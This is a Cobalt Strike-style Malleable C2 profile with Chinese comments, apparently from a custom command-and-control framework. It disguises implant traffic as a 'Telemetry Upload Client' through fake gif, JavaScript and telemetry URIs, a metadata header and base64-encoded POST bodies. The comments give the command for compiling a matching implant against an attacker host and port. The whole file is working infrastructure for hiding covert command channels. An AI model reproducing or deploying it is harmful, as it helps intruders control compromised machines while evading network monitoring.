#
# csdev :: csdev_http_b64.profile
# ==========================================================================
# 用途: 演示 / 验证 Malleable profile 的 body 变换链真正生效。
#
# 与前缀 profile 的区别: http-post 的 client/server output 链显式声明 base64,
# 因此服务端会对上行 body 做 base64 解码、对下行 body 做 base64 编码。
#
# **植入体必须用匹配的编译期常量编译**:
#   tools/gen_payload2.ps1 -Format win2-exe -Host_ <ip> -Port 8443 -Xform base64
# 或手工: gcc ... '-DC2_XFORM="base64"'
#
# 两侧不一致时帧解析会失败 (这是设计上的一致性要求, 不是缺陷) —— 表现为
# 植入体不上线或命令无回传, 服务端日志会出现帧解析错误。
# ==========================================================================

set sleeptime "3000";
set jitter    "20";
set sample_name "Telemetry Upload Client";

http-get {
    set uri "/assets/1x1.gif /static/app.js /api/v2/telemetry";

    client {
        header "Accept" "image/webp,*/*";
        metadata {
            base64;
            header "X-Trace";
        }
    }

    server {
        header "Content-Type" "image/gif";
        output {
            base64;
        }
    }
}

http-post {
    set uri "/submit /api/v2/events";

    client {
        header "Content-Type" "application/octet-stream";
        header "Accept" "*/*";
        id {
            parameter "sid";
        }
        output {
            base64;
        }
    }

    server {
        header "Content-Type" "application/octet-stream";
        output {
            base64;
        }
    }
}
